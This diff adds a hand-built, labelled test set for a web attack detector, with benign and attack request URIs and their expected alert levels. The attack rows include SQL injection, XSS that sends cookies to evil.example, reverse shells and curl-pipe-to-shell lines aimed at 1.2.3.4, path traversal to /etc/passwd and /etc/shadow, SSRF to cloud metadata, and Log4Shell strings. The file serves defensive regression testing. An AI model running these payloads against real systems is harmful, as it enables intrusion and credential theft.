@@ -1,0 +1,259 @@
+# 带标注的 Web 检测评测样本（手工构造，用于防止退化；不代表真实流量的准确率）
+# 列（Tab 分隔）：标注 分组 站点 方法 状态码 响应大小 期望等级 URI [UA]
+# 站点：app 为各接口响应大小正常的站点；spa 为所有路径都返回相同大小 200 的站点（单页应用、统一错误页）
+# 期望等级：none 不告警；<=X 不高于 X；>=X 不低于 X；=X 恰好为 X；- 只统计不校验；可加 @结果 同时校验研判结果，如 =high@passed
+benign	search	app	GET	200	5000	none	/search?q=union+square+hotels
+benign	search	app	GET	200	5000	none	/search?q=select+a+plan+from+the+list
+benign	search	app	GET	200	5000	none	/search?q=drop+table+tennis+lessons
+benign	search	app	GET	200	5000	<=low	/search?q=how+to+use+%3Cscript%3E+tag+in+html
+benign	search	app	GET	200	5000	none	/kb?q=sql+injection+prevention+guide
+benign	search	app	GET	200	5000	none	/kb/article/what-is-xss-and-csrf
+benign	search	app	GET	200	5000	none	/search?q=O%27Reilly+books
+benign	search	app	GET	200	5000	none	/search?q=1+or+2+tickets
+benign	search	app	GET	200	5000	none	/search?q=cat+%2Fetc+explained
+benign	search	app	GET	200	5000	<=low	/forum/thread?title=why+does+eval()+fail+in+strict+mode
+benign	search	app	GET	200	5000	none	/docs/linux/etc-passwd-file-format
+benign	search	app	GET	200	5000	none	/blog/log4j-vulnerability-explained
+benign	auth	app	GET	200	900	none	/oauth/callback?code=4%2F0AX4XfWh&state=abc&redirect_uri=https%3A%2F%2Fapp.example.com%2Fcb
+benign	auth	app	GET	200	900	none	/login?next=%2Fadmin%2Fdashboard
+benign	auth	app	GET	200	900	none	/login?returnUrl=https://www.example.com/home
+benign	auth	app	GET	200	900	none	/sso/acs?SAMLResponse=PHNhbWxwOlJlc3BvbnNlIHhtbG5zOnNhbWxwPQ&RelayState=%2Fhome
+benign	auth	app	GET	200	900	none	/api/me?token=eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0In0.abc123
+benign	auth	app	POST	200	900	<=low	/wp-login.php
+benign	cms	app	GET	200	400	<=low	/wp-admin/admin-ajax.php?action=heartbeat
+benign	cms	app	GET	200	60000	none	/wp-content/themes/twenty/style.css?ver=6.5
+benign	cms	app	GET	200	60000	none	/wp-content/plugins/woocommerce/assets/js/frontend.min.js?ver=8.0
+benign	cms	app	POST	200	900	none	/wp-json/wp/v2/posts/1?_method=PUT
+benign	cms	app	GET	200	9000	none	/index.php?route=product/category&path=20_27
+benign	cms	app	GET	200	9000	none	/index.php?m=content&c=index&a=show&catid=1&id=2
+benign	cms	app	GET	200	9000	none	/thinkphp/public/index.php/home/index/index
+benign	app	app	GET	200	2000	none	/api/v1/users?filter=status%3Dactive&sort=-created_at&page=2
+benign	app	app	GET	200	2000	none	/api/items?where=%7B%22id%22%3A1%7D
+benign	app	app	POST	200	2000	none	/graphql?query=%7Bme%7Bid%20name%7D%7D
+benign	app	app	GET	200	2000	none	/api/report?from=2026-01-01&to=2026-02-01&format=csv
+benign	app	app	GET	200	20000	none	/download?file=report-2026.pdf
+benign	app	app	GET	200	20000	none	/download?path=docs/manual/intro.pdf
+benign	app	app	GET	200	20000	none	/preview?url=https%3A%2F%2Fcdn.example.com%2Fa.png
+benign	app	app	GET	200	20000	none	/proxy/image?src=https://img.example.com/1.jpg
+benign	app	app	GET	200	300	none	/jsonp?callback=jQuery3510_1712345678
+benign	app	app	GET	200	300	none	/share?text=hello%20world%20%26%20friends&lang=zh-CN
+benign	app	app	GET	200	300	none	/template/render?name=invoice&vars=%7B%22a%22%3A1%7D
+benign	app	app	GET	200	300	none	/items?id=1&ids=1,2,3
+benign	app	app	GET	200	300	none	/page?content=%24%7Bprice%7D+discount
+benign	app	app	GET	200	300	none	/calc?expr=7*7
+benign	static	app	GET	200	90000	none	/assets/../assets/app.js
+benign	static	app	GET	200	90000	none	/static/js/chunk-vendors.2f4a.js
+benign	static	app	GET	200	4000	none	/favicon.ico
+benign	static	app	GET	200	200	none	/robots.txt
+benign	static	app	GET	200	2000	none	/sitemap.xml
+benign	static	app	GET	200	200	none	/.well-known/security.txt
+benign	static	app	GET	200	200	none	/.well-known/acme-challenge/x7Yz	acme-client
+benign	static	app	GET	200	4000	none	/apple-touch-icon.png
+benign	static	app	GET	200	4000	<=low	/admin/
+benign	static	app	GET	200	4000	none	/backup-policy.html
+benign	static	app	GET	200	4000	none	/config/settings
+benign	tools	app	GET	200	20	none	/healthz	kube-probe/1.29
+benign	tools	app	GET	200	5120	none	/	Prometheus/2.51
+benign	tools	app	GET	200	5120	none	/	Zabbix
+benign	tools	app	GET	200	5120	none	/	curl/8.5.0
+benign	tools	app	GET	200	2000	none	/api/status	python-requests/2.31
+benign	tools	app	GET	200	5120	none	/	Go-http-client/2.0
+benign	tools	app	GET	200	9000	none	/feed.xml	Googlebot/2.1 (+http://www.google.com/bot.html)
+benign	tools	app	GET	200	5120	none	/	UptimeRobot/2.0
+benign	tools	app	GET	200	5120	none	/	Mozilla/5.0 (compatible; bingbot/2.0)
+benign	tools	app	GET	200	300	none	/repo.git/info/refs?service=git-upload-pack	git/2.43
+attack	sqli	app	GET	200	3000	=high	/item?id=1'+or+'1'='1
+attack	sqli	app	GET	200	3000	=high@passed	/item?id=1+union+select+1,2,3--
+attack	sqli	app	GET	200	30000	=critical@success	/item?id=1%20UnIoN%20SeLeCt%20user(),2
+attack	sqli	app	GET	200	3000	=high	/item?id=1/**/union/**/select/**/1,2
+attack	sqli	app	GET	200	3000	=high	/item?id=1%2527%20or%201=1--
+attack	sqli	app	GET	200	3000	=high	/item?id=1;waitfor+delay+'0:0:5'--
+attack	sqli	app	GET	200	3000	=high	/item?id=1+and+sleep(5)
+attack	sqli	app	GET	200	3000	=high	/item?id=1+and+extractvalue(1,concat(0x7e,version()))
+attack	sqli	app	GET	200	3000	=high	/item?id=(select(1)from(select(sleep(5)))a)
+attack	sqli	app	GET	200	3000	=high	/item?id=1%0aunion%0aselect%0a1
+attack	sqli	app	GET	200	3000	=high	/item?id=-1'%20||%20pg_sleep(5)--
+attack	sqli	app	GET	200	3000	=high	/item?id=1+procedure+analyse()
+attack	sqli	app	GET	403	300	=high	/item?id=1+union+select+1,2,3--
+attack	sqli	spa	GET	200	2048	=high@passed	/item?id=1+union+select+1,2,3--
+attack	xss	app	GET	200	2000	>=medium	/s?q=<script>alert(1)</script>
+attack	xss	app	GET	200	2000	>=medium	/s?q=hello+world+<script>alert(1)</script>+more+words
+attack	xss	app	GET	200	2000	>=medium	/s?q=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
+attack	xss	app	GET	200	2000	>=medium	/s?q=%253Csvg%2520onload%253Dalert(1)%253E
+attack	xss	app	GET	200	2000	>=medium	/s?q=javascript:alert(document.cookie)
+attack	xss	app	GET	200	2000	>=medium	/s?q=%3Cdetails%20open%20ontoggle=alert(1)%3E
+attack	xss	app	GET	200	2000	>=medium	/s?q=%22%3E%3Ciframe%20srcdoc=x%3E
+attack	xss	app	GET	200	2000	>=medium	/s?q=read+this+<script+src=//evil.example/x.js>+now
+attack	rce	app	GET	200	512	=high	/ping?host=127.0.0.1;cat+/etc/passwd
+attack	rce	app	GET	200	512	=high	/ping?host=127.0.0.1|id
+attack	rce	app	GET	200	512	=high	/ping?host=$(whoami)
+attack	rce	app	GET	200	512	=high	/ping?host=`id`
+attack	rce	app	GET	200	512	=high	/ping?host=1%0awget+http://1.2.3.4/x.sh
+attack	rce	app	GET	200	512	=high	/ping?host=1;c%27a%27t+/etc/passwd
+attack	rce	app	GET	200	512	=high	/ping?host=1;cat$IFS/etc/passwd
+attack	rce	app	GET	200	512	=high	/cmd?c=powershell+-enc+SQBFAFgA
+attack	rce	app	GET	200	512	=high	/cmd?c=bash+-i+%3E%26+/dev/tcp/1.2.3.4/4444+0%3E%261
+attack	rce	app	GET	200	512	=high	/run?code=eval($_POST[x])
+attack	rce	app	GET	200	512	=high	/run?code=please+run+system('id')+for+me
+attack	rce	app	GET	200	9000	=critical@success	/ping?host=1;cat+/etc/passwd
+attack	rce	spa	GET	200	2048	=high@passed	/ping?host=1;cat+/etc/passwd
+attack	lfi	app	GET	200	4000	=high	/view?f=../../../../etc/passwd
+attack	lfi	app	GET	200	4000	=high	/view?f=..%2f..%2f..%2fetc%2fpasswd
+attack	lfi	app	GET	200	4000	=high	/view?f=%252e%252e%252fetc%252fpasswd
+attack	lfi	app	GET	200	4000	=high	/view?f=....//....//etc/passwd
+attack	lfi	app	GET	200	4000	=high	/view?f=..%c0%af..%c0%afetc/passwd
+attack	lfi	app	GET	200	4000	=high	/view?f=php://filter/convert.base64-encode/resource=index.php
+attack	lfi	app	GET	200	4000	=high	/view?f=C:\windows\win.ini
+attack	lfi	app	GET	200	40000	=critical@success	/view?f=../../../../etc/passwd
+attack	lfi	app	GET	200	1892	=high@success	/nobaseline?f=../../../../etc/passwd
+attack	lfi	app	GET	404	300	=high	/view?f=../../../../etc/passwd
+attack	lfi	app	GET	403	300	=high	/view?f=../../../../etc/passwd
+attack	lfi	app	GET	200	4000	=high	/a/b/../../../../etc/passwd
+attack	lfi	app	GET	200	4000	=high	/static/%2e%2e/%2e%2e/secret.txt
+attack	lfi	spa	GET	200	2048	=high@passed	/view?f=../../../../etc/passwd
+attack	ssrf	app	GET	200	800	=high	/fetch?url=http://169.254.169.254/latest/meta-data/
+attack	ssrf	app	GET	200	800	=high	/fetch?url=http://127.0.0.1:6379/
+attack	ssrf	app	GET	200	800	=high	/fetch?url=gopher://127.0.0.1:6379/_FLUSHALL
+attack	ssrf	app	GET	200	800	=high	/fetch?url=file:///etc/passwd
+attack	ssrf	app	GET	200	800	=high	/fetch?url=http://[::ffff:169.254.169.254]/
+attack	ssrf	app	GET	200	800	=high	/fetch?url=http://2130706433/
+attack	expr	app	GET	200	1000	=high	/a?x=${jndi:ldap://1.2.3.4/a}
+attack	expr	app	GET	200	1000	=high	/a?x=${${lower:j}ndi:${lower:l}dap://1.2.3.4/a}
+attack	expr	app	GET	200	1000	=high	/a?x=$%7Bjndi:rmi://1.2.3.4/a%7D	${jndi:ldap://1.2.3.4/b}
+attack	expr	app	GET	200	1000	=high	/a?x=%24%7B%28%23a%3D%40java.lang.Runtime%40getRuntime%28%29%29%7D
+attack	expr	app	GET	200	1000	>=medium	/a?name={{config.__class__.__init__.__globals__}}
+attack	expr	app	GET	200	1000	=high	/a?x=T(java.lang.Runtime).getRuntime().exec('id')
+attack	cve	app	GET	200	700	=high	/cgi-bin/.%2e/.%2e/.%2e/bin/sh
+attack	cve	app	POST	200	700	=high	/actuator/gateway/routes/x
+attack	cve	app	GET	200	700	>=medium	/actuator/env
+attack	cve	app	GET	200	700	=high	/console/images/%252e%252e%252fconsole.portal
+attack	cve	app	GET	200	700	=high	/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id
+attack	cve	app	GET	200	700	=high	/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+attack	cve	app	POST	200	700	=high	/_ignition/execute-solution
+attack	cve	app	GET	200	700	>=low	/solr/admin/cores?action=CREATE&dataimport
+attack	cve	app	GET	200	700	>=low	/nacos/v1/auth/users?pageNo=1&pageSize=9	Nacos-Server
+attack	cve	app	PUT	201	0	=critical	/upload/x.jsp
+attack	sens	app	GET	200	700	>=medium	/.git/config
+attack	sens	app	GET	200	700	>=medium	/.env
+attack	sens	app	GET	200	70000	>=medium	/backup.sql
+attack	sens	app	GET	200	70000	>=medium	/wwwroot.zip
+attack	sens	app	GET	200	700	>=medium	/WEB-INF/web.xml
+attack	sens	app	GET	200	700	>=low	/phpinfo.php
+attack	sens	spa	GET	200	2048	<=medium	/.env
+attack	webshell	app	POST	200	1200	=critical	/uploads/shell.php?cmd=id
+attack	webshell	app	POST	200	1300	=critical	/images/x.jsp
+attack	webshell	app	GET	200	1400	=high	/c99.php
+attack	webshell	app	GET	404	300	=high	/c99.php
+attack	webshell	spa	GET	200	2048	<=medium	/c99.php
+attack	scanner	app	GET	404	300	>=low	/	sqlmap/1.8#stable (https://sqlmap.org)
+attack	scanner	app	GET	404	300	>=low	/	Mozilla/5.0 (compatible; Nmap Scripting Engine)
+attack	scanner	app	GET	404	300	>=low	/	nuclei/3.2.0
+attack	scanner	app	GET	404	300	>=low	/	gobuster/3.6
+attack	deser	app	POST	200	700	=high	/invoker/readonly?d=rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA
+attack	deser	app	GET	200	700	=high	/a?x=O:8:%22stdClass%22:1:%7Bs:1:%22a%22;s:1:%22b%22;%7D
+attack	xxe	app	GET	200	700	=high	/a?x=%3C!DOCTYPE%20foo%20%5B%3C!ENTITY%20xxe%20SYSTEM%20%22file:///etc/passwd%22%3E%5D%3E
+# 以下样本先盲测再并入：第一次运行时攻击检出 62/63，正常样本告警 4 条（其中高危 1 条）
+benign	prose	app	GET	200	5000	<=low	/search?keyword=what+does+the+system()+call+do
+benign	prose	app	GET	200	5000	<=low	/ask?title=difference+between+exec()+and+eval()
+benign	prose	app	GET	200	5000	<=low	/search?q=iframe+vs+%3Ciframe%3E+element+tutorial
+benign	prose	app	GET	200	5000	none	/search?q=how+do+i+grant+select+on+table
+benign	prose	app	GET	200	5000	none	/search?q=insert+into+excel+from+sheet
+# 已知误报：union select 连写在文字里与真实注入无法安全区分
+benign	prose	app	GET	200	5000	-	/news?title=a+union+select+committee+meets
+benign	prose	app	GET	200	5000	none	/search?q=rock+%26+roll
+benign	prose	app	GET	200	5000	none	/search?q=C%23+tutorial
+benign	prose	app	GET	200	5000	none	/search?q=price%3C100+and+size%3E5
+benign	prose	app	GET	200	5000	none	/search?q=AT%26T+phone+bill
+benign	prose	app	GET	200	5000	none	/search?q=who+am+i
+benign	prose	app	GET	200	5000	none	/search?q=cat+and+dog+photos
+benign	prose	app	GET	200	5000	none	/search?q=ping+pong+table+%7C+best+price
+benign	prose	app	GET	200	5000	none	/s?wd=%E5%A6%82%E4%BD%95%E9%98%B2%E5%BE%A1SQL%E6%B3%A8%E5%85%A5
+benign	prose	app	GET	200	5000	none	/s?wd=%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB%E5%8E%9F%E7%90%86
+benign	app	app	GET	200	2000	none	/api/orders?status=paid&amp;page=3
+benign	app	app	GET	200	2000	none	/api/search?filter=name%20eq%20%27Bob%27
+benign	app	app	GET	200	2000	none	/api/list?orderBy=created_at%20desc
+benign	app	app	GET	200	2000	none	/odata/Products?$top=10&$skip=20&$select=Name,Price
+benign	app	app	GET	200	2000	none	/api/v2/time?tz=Asia/Shanghai
+benign	app	app	GET	200	2000	none	/track?ref=https%3A%2F%2Fwww.google.com%2Fsearch%3Fq%3Dabc
+benign	app	app	GET	200	2000	none	/redirect?to=https%3A%2F%2Fpartner.example.org%2Flanding
+benign	app	app	GET	200	2000	none	/img?u=//cdn.example.com/a/b.png&w=200
+benign	app	app	GET	200	2000	none	/api/file?name=my..report.pdf
+benign	app	app	GET	200	2000	none	/page?id=10&ver=1.2.3&debug=false
+benign	app	app	GET	200	2000	none	/api/geo?ip=8.8.8.8
+benign	app	app	POST	200	2000	none	/api/login
+benign	app	app	POST	200	2000	none	/api/upload/avatar
+benign	app	app	GET	200	2000	none	/wiki/Shell_(computing)
+benign	app	app	GET	200	2000	none	/docs/shell-scripting-guide.html
+benign	app	app	GET	200	2000	none	/products/seashell-lamp.jpg
+benign	app	app	GET	200	2000	none	/blog/cmd-line-tips
+benign	app	app	GET	200	2000	none	/uploads/2026/03/photo.jpg
+benign	app	app	GET	200	2000	none	/static/../favicon.ico
+benign	app	app	GET	200	2000	none	/a/b/../c/./d.css
+benign	app	app	GET	200	2000	none	/css/../fonts/icons.woff2?v=3
+benign	app	app	GET	200	2000	none	/downloads/backup-tool-setup.exe
+benign	app	app	GET	200	2000	none	/api/config
+benign	app	app	GET	200	2000	none	/health
+benign	app	app	OPTIONS	204	0	none	/api/v1/users
+attack	sqli	app	GET	200	3000	>=high	/item?id=1'+AND+1=1--+-
+attack	sqli	app	GET	200	3000	>=high	/item?id=1'+AnD+(SeLeCt+1+FrOm+dual)=1--
+attack	sqli	app	GET	200	3000	>=high	/item?id=1+or+1=1
+attack	sqli	app	GET	200	3000	>=high	/item?id=1'%09or%09'a'='a
+attack	sqli	app	GET	200	3000	>=high	/item?id=1+union+all+select+null,null,table_name+from+information_schema.tables
+attack	sqli	app	GET	200	3000	>=high	/item?id=1;exec+master..xp_cmdshell+'dir'--
+attack	sqli	app	GET	200	3000	>=high	/item?id=1+and+updatexml(1,concat(0x7e,user()),1)
+attack	sqli	app	GET	200	3000	>=high	/item?id=1+into+outfile+'/var/www/x.php'
+attack	sqli	app	GET	200	3000	>=high	/item?id=1'%20and%20ascii(substr((select%20database()),1,1))>100--
+attack	sqli	app	GET	200	3000	>=high	/item?id=1%2f**%2funion%2f**%2fselect%2f**%2f1
+attack	xss	app	GET	200	2000	>=medium	/s?q=<ScRiPt>prompt(1)</sCrIpT>
+attack	xss	app	GET	200	2000	>=medium	/s?q=<body+onload=alert(1)>
+attack	xss	app	GET	200	2000	>=medium	/s?q=<a+href=javascript:alert(1)>x</a>
+attack	xss	app	GET	200	2000	>=medium	/s?q='-alert(1)-'
+attack	xss	app	GET	200	2000	>=medium	/s?q=%26lt;script%26gt;alert(1)%26lt;/script%26gt;
+attack	xss	app	GET	200	2000	>=medium	/s?q=<svg><animate+onbegin=alert(1)+attributeName=x>
+attack	xss	app	GET	200	2000	>=medium	/s?q=<script>fetch('//evil.example/'+document.cookie)</script>
+attack	xss	app	GET	200	2000	>=medium	/s?q=nice+article+<script>location.href='//evil.example'</script>+thanks
+attack	rce	app	GET	200	512	>=high	/ping?host=8.8.8.8%26%26id
+attack	rce	app	GET	200	512	>=high	/ping?host=8.8.8.8;nc+-e+/bin/sh+1.2.3.4+4444
+attack	rce	app	GET	200	512	>=high	/ping?host=|curl+http://1.2.3.4/a.sh|sh
+attack	rce	app	GET	200	512	>=high	/run?code=system(base64_decode('aWQ='))
+attack	rce	app	GET	200	512	>=high	/run?code=phpinfo()
+attack	rce	app	GET	200	512	>=high	/run?code=eval(1)
+attack	rce	app	GET	200	512	>=high	/ping?host=;cmd.exe+/c+whoami
+attack	rce	app	GET	200	512	>=high	/ping?host=$%7BIFS%7Dcat$%7BIFS%7D/etc/shadow
+attack	lfi	app	GET	200	4000	>=high	/view?page=../../../../../../windows/system32/drivers/etc/hosts
+attack	lfi	app	GET	200	4000	>=high	/view?page=..%5c..%5c..%5cboot.ini
+attack	lfi	app	GET	200	4000	>=high	/view?page=/proc/self/environ
+attack	lfi	app	GET	200	4000	>=high	/view?page=zip://shell.jpg%23x
+attack	lfi	app	GET	200	4000	>=high	/view?page=http://evil.example/shell.txt
+attack	lfi	app	GET	200	4000	>=high	/..%2f..%2f..%2fetc/passwd
+attack	lfi	app	GET	200	4000	>=high	/%2e%2e/%2e%2e/%2e%2e/etc/shadow
+attack	lfi	app	GET	200	4000	>=high	/../../../../etc/hosts
+attack	lfi	app	GET	200	4000	>=high	/foo/..%252f..%252f..%252fetc/passwd
+attack	lfi	app	GET	200	4000	>=high	/index.php?file=....\\....\\windows\\win.ini
+attack	ssrf	app	GET	200	800	>=high	/fetch?url=http://metadata.google.internal/computeMetadata/v1/
+attack	ssrf	app	GET	200	800	>=high	/fetch?url=http://192.168.1.1/admin
+attack	ssrf	app	GET	200	800	>=high	/fetch?url=dict://127.0.0.1:11211/stats
+attack	ssrf	app	GET	200	800	>=high	/fetch?url=http://localhost:8500/v1/agent/self
+attack	expr	app	GET	200	1000	>=high	/a?x=${jndi:dns://1.2.3.4/a}
+attack	expr	app	GET	200	1000	>=high	/a	${jndi:ldap://evil.example/a}
+attack	expr	app	GET	200	1000	>=high	/a?x=%25%7B%23context%5B%27xwork.MethodAccessor.denyMethodExecution%27%5D%3Dfalse%7D
+attack	expr	app	GET	200	1000	>=high	/a?class.module.classLoader.resources.context.parent.pipeline.first.pattern=x
+attack	expr	app	GET	200	1000	>=medium	/a?tpl={{''.__class__.__mro__[1].__subclasses__()}}
+attack	cve	app	POST	200	700	>=high	/wls-wsat/CoordinatorPortType
+attack	cve	app	POST	200	700	>=high	/api/v1/convert?@type=com.sun.rowset.JdbcRowSetImpl
+attack	cve	app	GET	200	700	>=high	/seeyon/htmlofficeservlet
+attack	cve	app	GET	200	700	>=high	/weaver/bsh.servlet.BshServlet
+attack	cve	app	GET	200	700	>=medium	/.%2e/.%2e/etc/passwd
+attack	webshell	app	POST	200	1500	>=high	/upload/1.jsp
+attack	webshell	app	POST	200	1600	>=high	/images/logo.php
+attack	webshell	app	GET	200	1700	>=high	/x.php?cmd=whoami
+attack	webshell	app	POST	200	1800	>=high	/wso.php
+attack	webshell	app	GET	200	1900	>=high	/avatars/a.jsp
+attack	sens	app	GET	200	700	>=medium	/.svn/entries
+attack	sens	app	GET	200	701	>=medium	/.aws/credentials
+attack	sens	app	GET	200	702	>=medium	/id_rsa
+attack	sens	app	GET	200	70000	>=medium	/db.sql.gz
+attack	scanner	app	GET	404	300	>=low	/	Mozilla/5.0 zgrab/0.x
+attack	scanner	app	GET	404	300	>=low	/	masscan/1.3
+attack	scanner	app	GET	404	300	>=low	/	Mozilla/5.0 (compatible; Nikto/2.5)
+attack	scanner	app	GET	404	300	>=low	/	WPScan v3.8
